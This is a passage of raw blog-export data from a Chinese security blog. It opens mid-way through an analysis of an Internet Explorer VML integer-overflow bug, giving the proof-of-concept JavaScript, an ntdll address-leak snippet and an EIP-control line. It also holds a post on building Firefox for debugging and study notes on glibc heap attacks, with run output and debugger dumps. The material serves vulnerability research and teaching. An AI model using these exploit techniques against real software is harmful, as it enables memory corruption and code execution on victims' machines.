120:005&gt; ? 1cd3af50 +b0Evaluate expression: 483635200 = 1cd3b000 看看Get函数 12345678void __stdcall ORG::Get(ORG *this, void *Dst, int a3)&#123; if ( Dst ) memcpy( Dst, (const void *)(*((_DWORD *)this + 4) + a3 * (*((_DWORD *)this + 2) &amp; 0xFFFF)), *((_DWORD *)this + 2) &amp; 0xFFFF);&#125; 源地址来自第一个参数，我们再向上COALineDashStyleArray::get_item，但是这个还是来自上层的this 再上面就不是vgx的函数了，漏洞的出发点可能不在当前的堆栈信息中 作者又给了一种分析方法，就是尝试去理解poc的代码，其实这样的理解方式很好，会让你深刻地理解到代码的作用，触发异常或者漏洞利用的点，还可以对下一次类似代码的分析的时候提供帮助，那开始吧 一开始是一些包含，声明的东西，应该类似于我们的C，C++吧 12345&lt;!-- Include the VML behavior --&gt;&lt;style&gt;v\\: * &#123; behavior:url(#default#VML); display:inline-block &#125;&lt;/style&gt;&lt;!-- Declare the VML namespace --&gt;&lt;xml:namespace ns=\"urn:schemas-microsoft-com:vml\" prefix=\"v\" /&gt; 接下来看看body，加载就调用createRects函数，具体见注释 123456789&lt;body onload=\"createRects();\"&gt;&lt;v:oval&gt; &lt;!-- 用VML画圆 --&gt;&lt;v:stroke id=\"vml1\"/&gt; &lt;!-- 设置线条stroke的id --&gt;&lt;/v:oval&gt;&lt;v:oval&gt;&lt;v:stroke dashstyle=\"2 2 2 0 2 2 2 0\" id=\"shape\"/&gt; &lt;!-- 这里设置线条的风格和id --&gt;&lt;/v:oval&gt;&lt;input value=\"crash!!!\"type=\"button\" onclick=\"crashme();\"&gt;&lt;/input&gt;&lt;/body&gt; createRects函数，创建了400个v:shape元素，设置上id，并添加到body 12345678910var rect_array = new Array()var a = new Array()function createRects()&#123; for(var i=0; i&lt;0x400; i++)&#123; rect_array[i] = document.createElement(\"v:shape\") rect_array[i].id = \"rect\" + i.toString() document.body.appendChild(rect_array[i]) &#125;&#125; 最后就是crashme 123456789101112131415161718192021222324252627282930function crashme()&#123; var vml1 = document.getElementById(\"vml1\") var shape = document.getElementById(\"shape\") for (var i=0; i&lt;0x400; i++)&#123; //set up the heap a[i] = document.getElementById(\"rect\" + i.toString())._vgRuntimeStyle; &#125; //获取400个v:shape的_vgRuntimeStyle属性（即运行时样式） for (var i=0; i&lt;0x400; i++)&#123; a[i].rotation; //create a COARuntimeStyle 这里有点奇怪，只是获取了属性，当时没有任何赋值 if (i == 0x300) &#123; //allocate an ORG array of size B0h vml1.dashstyle = \"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44\" &#125; // i为300的时候设置vml1的dashstyle &#125; vml1.dashstyle.array.length = 0 - 1 //这两个都设置成-1（0xffffffff），这个很明显的可能的整数溢出操作 shape.dashstyle.array.length = 0 - 1 for (var i=0; i&lt;0x400; i++) &#123; //下面这里就是设置marginLeft，并获取dashstyle里面的item，作为marginLeftAddress，之后设置marginLeftAddress（0x2E+0x16=0x44） a[i].marginLeft = \"a\"; marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16); if (marginLeftAddress &gt; 0) &#123; try&#123; shape.dashstyle.array.item(0x2E+0x16+i) = 0x4b5f5f4b; &#125; catch(e) &#123;continue&#125; &#125; &#125;&#125; 接下来我们根据作者的注释COARuntimeStyle，在ida搜索一下，一开始的操作_vgRuntimeStyle和rotation应该跟这个类相关的 那dashstyle的操作呢，我们也可以找到操作，而且那个看着基本肯定是整数溢出的-1，我们也看到了XXXArray::put_length的操作 那我们就下来跟踪一下put_length的操作，对COALineDashStyleArray::put_length下断点，用bu吧 123456789101112131415160:005&gt; gBreakpoint 0 hiteax=0000000a ebx=68514964 ecx=6850dad5 edx=0883cfea esi=08e4ee80 edi=0464bf64eip=6850dad5 esp=0464bf18 ebp=0464bf30 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202vgx!COALineDashStyleArray::put_length:6850dad5 8bff mov edi,edi0:005&gt; dd esp0464bf18 759d3ec3 1dac4ff0 ffffffff 0883cfa40464bf28 043d17d8 0464bf24 0464bfc0 759d3d3d0464bf38 1dac4ff0 00000030 00000004 0000000a0464bf48 00000001 0883cfec 0883cfe4 0464bf640464bf58 6853223c 00000002 759cf958 759c00000464bf68 761f66bc 0883cfa0 04f4bf30 1dac4ff00464bf78 0883cfa0 00000060 00000000 0464bfa00464bf88 759c3ea3 0883cfa0 00000050 00000001 可以看到第二个参数为-1(0xffffffff) 我们一步步跟，发现这个函数并没有什么异常，但是我们可能对DeleteRange这个函数有疑虑， 下面跟进DeleteRange，它调用了MsoDeletePx 1234void __stdcall ORG::DeleteRange(ORG *this, int a2, int a3)&#123; MsoDeletePx((char *)this + 4, a2, a3);&#125; 继续 12345int __stdcall MsoDeletePx(void *Dst, int a2, int a3)&#123; MsoFRemovePx(Dst, a2, a3); return MsoFCompactPx(Dst, *(_WORD *)Dst == 0);&#125; 由于上面传递的是(char *)this + 4，实际上当前Dst指向的就是dashstyle的长度 123456789101112131415161718192021222324252627282930313233343536373839404142434445int __stdcall MsoFRemovePx(void *Dst, int length, int a3)&#123; _WORD *dashstyleLen; // esi@1 unsigned int v4; // edi@1 char *v5; // ecx@1 char *v6; // edi@2 bool v7; // zf@3 int v8; // edx@9 char *Dsta; // [sp+14h] [bp+8h]@2 int lengtha; // [sp+18h] [bp+Ch]@2 dashstyleLen = Dst; v4 = *((_DWORD *)Dst + 1) &amp; 0xFFFF; v5 = (char *)(*((_DWORD *)Dst + 3) + length * v4); if ( *((_DWORD *)Dst + 1) &lt; 0 ) // 不进入if &#123; lengtha = 0; Dsta = v5; v6 = v5; while ( a3 ) &#123; v7 = (*(_DWORD *)v6)-- == 1; if ( v7 ) &#123; ++lengtha; &#125; else &#123; memcpy(Dsta, v6, dashstyleLen[2]); Dsta += *((_DWORD *)dashstyleLen + 1) &amp; 0xFFFF; &#125; --a3; v6 += *((_DWORD *)dashstyleLen + 1) &amp; 0xFFFF; &#125; a3 = lengtha; v4 = *((_DWORD *)dashstyleLen + 1) &amp; 0xFFFF; v5 = Dsta; length = (unsigned int)&amp;Dsta[-*((_DWORD *)dashstyleLen + 3)] / v4; &#125; v8 = *dashstyleLen; if ( a3 + length != v8 &amp;&amp; a3 &gt; 0 ) // 由于a3 + length 相当于变回dashstyleLen了，所以这里相等，不满足if条件，跳过if memmove(v5, &amp;v5[a3 * v4], v4 * (v8 - length - a3)); *dashstyleLen -= a3; // 重点来了，dashstyleLen减去一个比自己大1的值，最终导致dashstyle变成-1（0xffff）了 return a3;&#125; 为什么是0xfffff呢，因为汇编指令是word啊 1sub word ptr [esi],bx 我们看看实际内存 120:005&gt; dd esi l11d818fec 002cffff 实际我们只有0x2c大小，但是这里实际设置成了0xffff 所以我们后面用dashstyle.array.item索引的时候就绕过了长度检测，最终触发异常 但是这里值得思考的是，为什么要触发两个整数溢出，第一个用了获取，没出发异常，第二次写入才触发的异常（后来发现exp就触发了一次整数溢出） 漏洞利用参考：http://bobao.360.cn/learning/detail/3029.html 下面只是分析别人的结果 先看信息泄露,贴出跟poc不同的部分，可以看到先获取marginLeftAddress，保存后，就将那个地址的值改为我们想要读取的值，比如下面的0x7ffe0300（在这个地址处存放的值与ntdll.dll模块的基地址有一个固定的偏移），之后就通过a[i].marginLeft泄露0x7ffe0300里面的值，但是不要忘记恢复marginLeftAddress的值，最后通过偏移计算出ntdll的基址 12345678910111213for (var i=0; i&lt;0x400; i++) &#123; a[i].marginLeft = \"a\"; marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16); if (marginLeftAddress &gt; 0) &#123; vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300; var leak = a[i].marginLeft; vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress; vml1.dashstyle.array.length = length_orig; ntdll_base=parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16), 16 ) - 290992; (ntdll_base.toString(16)); break; &#125;&#125; 控制eip是下面的， 12vml1.dashstyle.array.length = 0 - 1;vml1.dashstyle.array.item(6) = 0x0c0c0c0c; 堆喷代码","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"}]},{"title":"在Windows下编译 Firefox","slug":"在Windows下编译 Firefox","date":"2017-10-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/10/11/在Windows下编译 Firefox/","link":"","permalink":"https://www.giantbranch.cn/2017/10/11/在Windows下编译 Firefox/","excerpt":"","text":"简介最近分析CVE-2013-0750 Firefox 字符串替换整数溢出漏洞，尝试一下源码调试的分析方法，所以记录一下编译过程，本次以编译firefox17.0为例记录 环境搭建 源码 MozillaBuild Visual Studio Windows 7 32位（我用的是这个） 各版本的源码可以从下面的连接下载 https://archive.mozilla.org/pub/firefox/releases/ 编译工具MozillaBuild下载（这个推荐是下载与源码发布实践相近的版本，我下的是1.7） http://ftp.mozilla.org/pub/mozilla/libraries/win32/ 还有我用的vs2012，漏洞战争用的是2010，我自己试过vs2008，不知道不是不express版的问题，编译出错，说SDK缺少了某个头文件 实践 将源码和MozillaBuild到一个目录，我是直接解压到盘符的根目录了，防止有意外的中文编码什么错误 去源码的./brower/config目录复制mozconfig文件到源码根目录，之后打开文件添加如下配置（其实直接在源码根目录直接新建就可以了感觉） 1234ac_add_options --enable-application=browserexport MOZ_DEBUG_SYMBOLS=1ac_add_options --enable-debugac_add_options --disable-webgl –disable-webgl的话是当时发现编译不了添加的 之后打开mozilla-build目录，根据你下载的vs版本打开start-msvc.bat文件（最好还是以管理员运行吧） 比如vs2012是start-msvc11.bat，2010是start-msvc10.bat 最后cd到源码的路径，执行make –f client.mk build命令即可，无意外就等待1个半到两个小时就完成了 完成截图 最后的exe在源码目录中的objxxxxxx\\dist\\bin目录下 打开如图：","categories":[],"tags":[]},{"title":"how2heap学习","slug":"how2heap学习","date":"2017-09-29T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/09/29/how2heap学习/","link":"","permalink":"https://www.giantbranch.cn/2017/09/29/how2heap学习/","excerpt":"","text":"first_fit这个就是体验堆分配的策略，找到最合适的那个，这个uaf的漏洞利用提供了机会 12345678910111213141516171819root@kali:~/learn/how2heap# ./first_fit This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.glibc uses a first-fit algorithm to select a free chunk.If a chunk is free and large enough, malloc will select this chunk.This can be exploited in a use-after-free situation.Allocating 2 buffers. They can be large, don't have to be fastbin.1st malloc(512): 0x5567377d64202nd malloc(256): 0x5567377d6630we could continue mallocing here...now let's put a string at a that we can read later \"this is A!\"first allocation 0x5567377d6420 points to this is A!Freeing the first one...We don't need to free anything again. As long as we allocate less than 512, it will end up at 0x5567377d6420So, let's allocate 500 bytes3rd malloc(500): 0x5567377d6420And put a different string here, \"this is C!\"3rd allocation 0x5567377d6420 points to this is C!first allocation 0x5567377d6420 points to this is C!If we reuse the first allocation, it now holds the data from the third allocation. fastbin_dup通过演示滥用fastbin freelist来欺骗malloc返回已分配的堆指针。其实就是fastbin的double free 1234567891011121314root@kali:~/learn/how2heap# ./fastbin_dup This file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0x5565d7d0b4202nd malloc(8): 0x5565d7d0b4403rd malloc(8): 0x5565d7d0b460Freeing the first one...If we free 0x5565d7d0b420 again, things will crash because 0x5565d7d0b420 is at the top of the free list.So, instead, we'll free 0x5565d7d0b440.Now, we can free 0x5565d7d0b420 again, since it's not the head of the free list.Now the free list has [ 0x5565d7d0b420, 0x5565d7d0b440, 0x5565d7d0b420 ]. If we malloc 3 times, we'll get 0x5565d7d0b420 twice!1st malloc(8): 0x5565d7d0b4202nd malloc(8): 0x5565d7d0b4403rd malloc(8): 0x5565d7d0b420 代码先free一次a，再free一次b，最后再free一次a，就把a给free了两次，最后在malloc三次，就将同一块内存分配了两次了 那么我们直接free一次a，再free一次a会怎么样呢 从下面可以看到直接退出了，可以看到检测到double free or corruption (fasttop): 0x000055f7d069e420 我们注意到fasttop这个单词，应该就是在fastbin的顶部检测到a被free了两次了 12345678910111213141516171819202122232425262728293031323334353637383940414243root@kali:~/learn/how2heap# ./fastbin_dup2This file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0x55f7d069e4202nd malloc(8): 0x55f7d069e4403rd malloc(8): 0x55f7d069e460Freeing the first one...If we free 0x55f7d069e420 again, things will crash because 0x55f7d069e420 is at the top of the free list.*** Error in `./fastbin_dup2': double free or corruption (fasttop): 0x000055f7d069e420 ***======= Backtrace: =========/lib/x86_64-linux-gnu/libc.so.6(+0x70bcb)[0x7f7f4ea4dbcb]/lib/x86_64-linux-gnu/libc.so.6(+0x76f96)[0x7f7f4ea53f96]/lib/x86_64-linux-gnu/libc.so.6(+0x7778e)[0x7f7f4ea5478e]./fastbin_dup2(+0x852)[0x55f7d0205852]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7f7f4e9fd2b1]./fastbin_dup2(+0x67a)[0x55f7d020567a]======= Memory map: ========55f7d0205000-55f7d0206000 r-xp 00000000 08:01 2103960 /root/learn/how2heap/fastbin_dup255f7d0405000-55f7d0406000 r--p 00000000 08:01 2103960 /root/learn/how2heap/fastbin_dup255f7d0406000-55f7d0407000 rw-p 00001000 08:01 2103960 /root/learn/how2heap/fastbin_dup255f7d069e000-55f7d06bf000 rw-p 00000000 00:00 0 [heap]7f7f48000000-7f7f48021000 rw-p 00000000 00:00 0 7f7f48021000-7f7f4c000000 ---p 00000000 00:00 0 7f7f4e7c6000-7f7f4e7dc000 r-xp 00000000 08:01 1443787 /lib/x86_64-linux-gnu/libgcc_s.so.17f7f4e7dc000-7f7f4e9db000 ---p 00016000 08:01 1443787 /lib/x86_64-linux-gnu/libgcc_s.so.17f7f4e9db000-7f7f4e9dc000 r--p 00015000 08:01 1443787 /lib/x86_64-linux-gnu/libgcc_s.so.17f7f4e9dc000-7f7f4e9dd000 rw-p 00016000 08:01 1443787 /lib/x86_64-linux-gnu/libgcc_s.so.17f7f4e9dd000-7f7f4eb72000 r-xp 00000000 08:01 1443750 /lib/x86_64-linux-gnu/libc-2.24.so7f7f4eb72000-7f7f4ed71000 ---p 00195000 08:01 1443750 /lib/x86_64-linux-gnu/libc-2.24.so7f7f4ed71000-7f7f4ed75000 r--p 00194000 08:01 1443750 /lib/x86_64-linux-gnu/libc-2.24.so7f7f4ed75000-7f7f4ed77000 rw-p 00198000 08:01 1443750 /lib/x86_64-linux-gnu/libc-2.24.so7f7f4ed77000-7f7f4ed7b000 rw-p 00000000 00:00 0 7f7f4ed7b000-7f7f4ed9e000 r-xp 00000000 08:01 1443722 /lib/x86_64-linux-gnu/ld-2.24.so7f7f4ef79000-7f7f4ef7b000 rw-p 00000000 00:00 0 7f7f4ef9a000-7f7f4ef9e000 rw-p 00000000 00:00 0 7f7f4ef9e000-7f7f4ef9f000 r--p 00023000 08:01 1443722 /lib/x86_64-linux-gnu/ld-2.24.so7f7f4ef9f000-7f7f4efa0000 rw-p 00024000 08:01 1443722 /lib/x86_64-linux-gnu/ld-2.24.so7f7f4efa0000-7f7f4efa1000 rw-p 00000000 00:00 0 7fff98880000-7fff988a1000 rw-p 00000000 00:00 0 [stack]7fff989d1000-7fff989d3000 r--p 00000000 00:00 0 [vvar]7fff989d3000-7fff989d5000 r-xp 00000000 00:00 0 [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]已放弃 fastbin_dup_into_stack通过滥用fastbin freelist，欺骗malloc返回一个近乎任意的指针。 1234567891011121314151617181920212223root@kali:~/learn/how2heap# ./fastbin_dup_into_stack This file extends on fastbin_dup.c by tricking malloc intoreturning a pointer to a controlled location (in this case, the stack).The address we want malloc() to return is 0x7fff19d56580.Allocating 3 buffers.1st malloc(8): 0x55a0bfdda4202nd malloc(8): 0x55a0bfdda4403rd malloc(8): 0x55a0bfdda460Freeing the first one...If we free 0x55a0bfdda420 again, things will crash because 0x55a0bfdda420 is at the top of the free list.So, instead, we'll free 0x55a0bfdda440.Now, we can free 0x55a0bfdda420 again, since it's not the head of the free list.Now the free list has [ 0x55a0bfdda420, 0x55a0bfdda440, 0x55a0bfdda420 ]. We'll now carry out our attack by modifying data at 0x55a0bfdda420.1st malloc(8): 0x55a0bfdda4202nd malloc(8): 0x55a0bfdda440Now the free list has [ 0x55a0bfdda420 ].Now, we have access to 0x55a0bfdda420 while it remains at the head of the free list.so now we are writing a fake free size (in this case, 0x20) to the stack,so that malloc will think there is a free chunk there and agree toreturn a pointer to it.Now, we overwrite the first 8 bytes of the data at 0x55a0bfdda420 to point right before the 0x20.3rd malloc(8): 0x55a0bfdda420, putting the stack address on the free list4th malloc(8): 0x7fff19d56580 可以看到最终分配返回的已经不是堆变量，而是一个栈的地址，那么我们就有可能去覆盖栈上的东西，比如最经典的返回地址 那么是怎么覆盖的呢，一开始free a b a的顺序构造出了下面这样的free list [ 0x55a0bfdda420, 0x55a0bfdda440, 0x55a0bfdda420 ] 我们调试看看（由于多次调试地址有所改变，但左后的一个字节应该是不变的），我们看到了我们分配的堆，我们看到fd已经有值了，但是为什么头部仍是0x21，最低位是1（后来问别人fastbin的这个位永远是1） 1234567891011121314151617181920gdb-peda$ heapArena(s) found: arena @ 0x7ffff7dd3b00gdb-peda$ x /20gx 0x7ffff7dd3b000x7ffff7dd3b00 &lt;main_arena&gt;: 0x0000000000000000 0x00005555557574100x7ffff7dd3b10 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd3b20 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd3b30 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd3b40 &lt;main_arena+64&gt;: 0x0000000000000000 0x0000000000000000gdb-peda$ x /20gx 0x00005555557574100x555555757410: 0x0000000000000000 0x00000000000000210x555555757420: 0x0000555555757430 0x00000000000000000x555555757430: 0x0000000000000000 0x00000000000000210x555555757440: 0x0000555555757410 0x00000000000000000x555555757450: 0x0000000000000000 0x00000000000000210x555555757460: 0x0000000000000000 0x00000000000000000x555555757470: 0x0000000000000000 0x0000000000020b910x555555757480: 0x0000000000000000 0x00000000000000000x555555757490: 0x0000000000000000 0x00000000000000000x5555557574a0: 0x0000000000000000 0x0000000000000000 现在list是这样的arena指向0x555555757410，0x555555757410指向0x555555757430，0x555555757430又指向0x555555757410这样，我们继续，其实这里构成了一个内循环了 首先malloc一次，arena已经指向0x0000555555757430了 12gdb-peda$ x /2gx 0x7ffff7dd3b000x7ffff7dd3b00 &lt;main_arena&gt;: 0x0000000000000000 0x0000555555757430 思考一下：那么这里我们就可以看到这是将0x555555757410的fd写到这里来了，假如我们将0x555555757410的fd改了，那么就可以将我们需要的值写到arena的位置，之后再malloc，就返回这个地址，我们对这个地址就有写权限了（但一开始由于这个是free状态，所以我们无法改写，是实践截图如下：） 那接下来再malloc，main_arena这里又指向0x0000555555757410 12345678910gdb-peda$ x /2gx 0x7ffff7dd3b000x7ffff7dd3b00 &lt;main_arena&gt;: 0x0000000000000000 0x0000555555757410gdb-peda$ x /20gx 0x00005555557574100x555555757410: 0x0000000000000000 0x00000000000000210x555555757420: 0x0000555555757430 0x00000000000000000x555555757430: 0x0000000000000000 0x00000000000000210x555555757440: 0x0000555555757410 0x00000000000000000x555555757450: 0x0000000000000000 0x00000000000000210x555555757460: 0x0000000000000000 0x00000000000000000x555555757470: 0x0000000000000000 0x0000000000020b91 那么正如作者所说 Now, we have access to 0x555555757420 while it remains at the head of the free list. 在之后将一个long long类型的局部变量赋值为0x20，这个用于伪造前一个chunk为空闲 1stack_var = 0x20; 汇编看结果如下： 12gdb-peda$ x /gx $rbp-0x280x7fffffffe4f8: 0x0000000000000020 之后将stack_var地址-8的地址覆盖第一个堆块（chunk）的fd 1*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); 汇编如下： 12 0x555555554965 &lt;main+485&gt;: lea rax,[rbp-0x28]=&gt; 0x555555554969 &lt;main+489&gt;: sub rax,0x8 之后可以看到第一个chunk的fd已经被覆盖了成了0x00007fffffffe4f0，这是栈上变量stack_var的向前偏移8个字节的地址 123456gdb-peda$ x /10gx 0x5555557574100x555555757410: 0x0000000000000000 0x00000000000000210x555555757420: 0x00007fffffffe4f0 0x00000000000000000x555555757430: 0x0000000000000000 0x00000000000000210x555555757440: 0x0000555555757410 0x00000000000000000x555555757450: 0x0000000000000000 0x0000000000000021 此时我们第3次malloc，0x00007fffffffe4f0已经写到main_arena上了 12gdb-peda$ x /2gx 0x7ffff7dd3b000x7ffff7dd3b00 &lt;main_arena&gt;: 0x0000000000000000 0x00007fffffffe4f0 那么下次再malloc就直接从这0x00007fffffffe4f0头上取了 最终的分配就返回了0x00007fffffffe500，因为返回的是指向数据区的指针 1234gdb-peda$ x /6gx 0x7fffffffe4f00x7fffffffe4f0: 0x0000000000000000 0x00000000000000200x7fffffffe500: 0x0000555555757420 0x00005555557574600x7fffffffe510: 0x0000555555757440 0x0000555555757420 问题 我们能只在不malloc的情况下直接改写第一个chunk的fd吗？ 这样会出现段错误 123456789101112131415root@kali:~/learn/how2heap# ./fastbin_dup_into_stack_q1 This file extends on fastbin_dup.c by tricking malloc intoreturning a pointer to a controlled location (in this case, the stack).The address we want malloc() to return is 0x7ffc46138e78.Allocating 3 buffers.1st malloc(8): 0x55efef1c04202nd malloc(8): 0x55efef1c04403rd malloc(8): 0x55efef1c0460Freeing the first one...If we free 0x55efef1c0420 again, things will crash because 0x55efef1c0420 is at the top of the free list.So, instead, we'll free 0x55efef1c0440.Now, we can free 0x55efef1c0420 again, since it's not the head of the free list.Now the free list has [ 0x55efef1c0420, 0x55efef1c0440, 0x55efef1c0420 ]. We'll now carry out our attack by modifying data at 0x55efef1c0420.3rd malloc(8): 0x55efef1c0420, putting the stack address on the free list段错误 调试的时候不知道为啥改得不彻底，看了下原来是mov DWORD PTR [rax],edx，是edx，可能 123456gdb-peda$ x /10gx 0x5555557564100x555555756410: 0x0000000000000000 0x00000000000000210x555555756420: 0x00005555ffffe4f8 0x00000000000000000x555555756430: 0x0000000000000000 0x00000000000000210x555555756440: 0x0000555555756410 0x00000000000000000x555555756450: 0x0000000000000000 0x0000000000000021 原来d声明的时候就是unsigned long long *d = malloc(8); 后来我改a为unsigned long long，free完直接改也是可以的 如果不伪造0x20行吗 实践告诉你是不行的 1*** Error in `/root/learn/how2heap/fastbin_dup_into_stack_q2': malloc(): memory corruption (fast): 0x00007fffffffe500 *** 因为fastbin申请的时候会检测这个堆块的大小是否是当前这条单向链表上的大小 unsafe_unlinkfree触发的unlink，以获得任意的写能力。 12345678910111213141516171819202122232425262728293031323334Welcome to unsafe unlink 2.0!Tested in Ubuntu 14.04/16.04 64bit.This technique can be used when you have a pointer at a known location to a region you can call unlink on.The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.The global chunk0_ptr is at 0x55e76c62d050, pointing to 0x55e76d301420The victim chunk we are going to corrupt is at 0x55e76d3014b0We create a fake chunk inside chunk0.We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == FalseFake chunk fd: 0x55e76c62d038Fake chunk bk: 0x55e76c62d040We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd-&gt;prev_size)With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == FalseP = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).We just need to set the *(chunk0_ptr + x) = x, so we can pass the check1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x00000008You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordinglyIf we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.Original value: Hello!~New Value: BBBBAAAA 0m 2017年3月增加了个检测https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 1234+2017-03-17 Chris Evans &lt;scarybeasts@gmail.com&gt;++ * malloc/malloc.c (unlink): Add consistency check between size and+ next-&gt;prev-&gt;size, to further harden against 1-byte overflows. 首先malloc size是0x80，避免释放后放到fasebins 申请两个chunk 将chunk0的0x20和0x28偏移伪造成fd和bk，使P-&gt;fd-&gt;bk,P-&gt;bk-&gt;fd指向自己 将chunk1的prev size覆盖为0x80，previous_in_use覆盖为0，那么free的时候找前一个chunk就指向我们伪造的chunk了，而且认为是free过了的，所以free chunk1就会触发unlink chunk0 unlink源码 https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344 free之前状态如下： 1234567891011121314151617181920pwndbg&gt; x /50gx 0x5555557574100x555555757410: 0x0000000000000000 0x00000000000000910x555555757420: 0x0000000000000000 0x00000000000000080x555555757430: 0x0000555555756038 0x00005555557560400x555555757440: 0x0000000000000000 0x00000000000000000x555555757450: 0x0000000000000000 0x00000000000000000x555555757460: 0x0000000000000000 0x00000000000000000x555555757470: 0x0000000000000000 0x00000000000000000x555555757480: 0x0000000000000000 0x00000000000000000x555555757490: 0x0000000000000000 0x00000000000000000x5555557574a0: 0x0000000000000080 0x00000000000000900x5555557574b0: 0x0000000000000000 0x00000000000000000x5555557574c0: 0x0000000000000000 0x00000000000000000x5555557574d0: 0x0000000000000000 0x00000000000000000x5555557574e0: 0x0000000000000000 0x00000000000000000x5555557574f0: 0x0000000000000000 0x00000000000000000x555555757500: 0x0000000000000000 0x00000000000000000x555555757510: 0x0000000000000000 0x00000000000000000x555555757520: 0x0000000000000000 0x00000000000000000x555555757530: 0x0000000000000000 0x0000000000020ad1 简单unlink代码如下： 1234FD = P-&gt;fd;BK = P-&gt;bk;FD-&gt;bk = BK;BK-&gt;fd = FD; 那么指向chunk0的指针就会被改写为0x0000555555756038 12pwndbg&gt; p chunk0_ptr$1 = (uint64_t *) 0x555555756038 我们再对chunk0进行写入就可能覆盖那边指针了 123pwndbg&gt; x /50gx 0x00005555557560380x555555756038: 0x0000000000000000 0x00005555557560400x555555756048 &lt;completed&gt;: 0x0000000000000000 0x0000555555756038 所以作者使用chunk0_ptr3 = (uint64_t) victim_string;来覆盖chunk0指针指向victim_string 之后便可以利用chunk0_ptr[0]修改victim_string的值了 house_of_spirit释放一个伪fastbin块，以使malloc返回一个近乎任意的指针。 12345678910111213root@kali:~/how2heap# ./house_of_spirit This file demonstrates the house of spirit attack.Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake 'fastbin' region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd0a5e3328 and the second at 0x7ffd0a5e3358.This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd0a5e3328.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffd0a5e3328, which will be 0x7ffd0a5e3330!malloc(0x30): 0x7ffd0a5e3330 由于是fastbin大小的chunk，所以PREV_INUSE是被忽略的，IS_MMAPPED跟NON_MAIN_ARENA有影响，设置为0即可 所以设置chunk的大小为0x40 下一个chunk的大小应该不用太在意 